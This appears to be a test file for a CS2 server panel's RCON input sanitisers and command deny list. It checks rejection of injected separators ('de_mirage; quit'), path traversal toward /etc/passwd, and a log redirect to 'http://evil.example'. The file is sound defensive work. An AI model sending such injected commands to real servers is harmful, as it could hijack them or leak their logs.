import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  assertCommandAllowed,
  assertValidMapName,
  assertWorkshopId,
  quoteArg,
  safeInt,
  safeToken,
} from "@/lib/cs2/sanitize";
import { safeEqual } from "@/lib/auth";

describe("quoteArg", () => {
  it("strips characters that break out of a quoted RCON argument", () => {
    // `hostname "pwned"; sv_cheats 1; echo "` would otherwise run two extra
    // commands on the game server.
    const escaped = quoteArg('pwned"; sv_cheats 1; echo "');
    assert.ok(!escaped.includes('"'));
    assert.ok(!escaped.includes(";"));
  });

  it("strips newlines and backticks", () => {
    const escaped = quoteArg("a\nb\rc`d");
    assert.equal(escaped, "abcd");
  });

  it("caps length", () => {
    assert.equal(quoteArg("x".repeat(500)).length, 255);
  });

  it("leaves ordinary hostnames intact, spaces included", () => {
    assert.equal(quoteArg("sidearm-5v5-comp"), "sidearm-5v5-comp");
    // Spaces are safe inside the double quotes every caller wraps this in, and
    // stripping them would turn a server name into `sidearm|5v5comp` and a kick
    // reason into one run-on word.
    assert.equal(quoteArg("sidearm | 5v5 comp"), "sidearm | 5v5 comp");
    assert.equal(quoteArg("no toxicity please"), "no toxicity please");
  });
});

describe("safeToken", () => {
  it("keeps only identifier characters", () => {
    assert.equal(safeToken("de_mirage"), "de_mirage");
    assert.equal(safeToken("2; quit"), "2quit");
  });
});

describe("safeInt", () => {
  it("clamps into range and falls back on nonsense", () => {
    assert.equal(safeInt(5, 1, 64, 10), 5);
    assert.equal(safeInt(999, 1, 64, 10), 64);
    assert.equal(safeInt(-3, 1, 64, 10), 1);
    assert.equal(safeInt("abc", 1, 64, 10), 10);
    assert.equal(safeInt(undefined, 1, 64, 10), 10);
  });
});

describe("assertValidMapName", () => {
  it("accepts official and workshop maps", () => {
    assert.equal(assertValidMapName("de_mirage"), "de_mirage");
    assert.equal(
      assertValidMapName("workshop/3070563536/de_cache"),
      "workshop/3070563536/de_cache",
    );
  });

  it("accepts a workshop map whose filename is not known yet", () => {
    // What `host_workshop_map` takes, and all the panel knows before the
    // server has downloaded the map.
    assert.equal(
      assertValidMapName("workshop/3070563536"),
      "workshop/3070563536",
    );
  });

  it("rejects anything that could carry a second command", () => {
    for (const bad of [
      "de_mirage; quit",
      'de_mirage"',
      "../../etc/passwd",
      "",
      "workshop/",
      "workshop/abc",
      "workshop/123/de_cache/../../etc",
    ]) {
      assert.throws(() => assertValidMapName(bad), `should reject ${JSON.stringify(bad)}`);
    }
  });
});

describe("assertWorkshopId", () => {
  it("accepts digits only", () => {
    assert.equal(assertWorkshopId("3070563536"), "3070563536");
    assert.throws(() => assertWorkshopId("123; quit"));
    assert.throws(() => assertWorkshopId("abc"));
  });
});

describe("assertCommandAllowed", () => {
  it("allows ordinary commands", () => {
    assert.equal(assertCommandAllowed("status"), "status");
    assert.equal(assertCommandAllowed("mp_restartgame 1"), "mp_restartgame 1");
  });

  it("blocks commands that kill or reconfigure the server", () => {
    for (const bad of ["quit", "exit", "sv_setsteamaccount ABC", "rcon_password hunter2"]) {
      assert.throws(() => assertCommandAllowed(bad), `should block ${bad}`);
    }
  });

  it("blocks a denied command hidden behind a separator", () => {
    assert.throws(() => assertCommandAllowed("status; quit"));
    assert.throws(() => assertCommandAllowed("status ; QUIT"));
  });

  it("blocks redirecting the log stream", () => {
    assert.throws(() => assertCommandAllowed("logaddress_add_http http://evil.example"));
  });
});

describe("safeEqual", () => {
  it("matches identical strings and rejects everything else", () => {
    assert.equal(safeEqual("abc123", "abc123"), true);
    assert.equal(safeEqual("abc123", "abc124"), false);
    assert.equal(safeEqual("abc", "abcd"), false);
    // An unset token must never authenticate.
    assert.equal(safeEqual("", ""), false);
  });
});
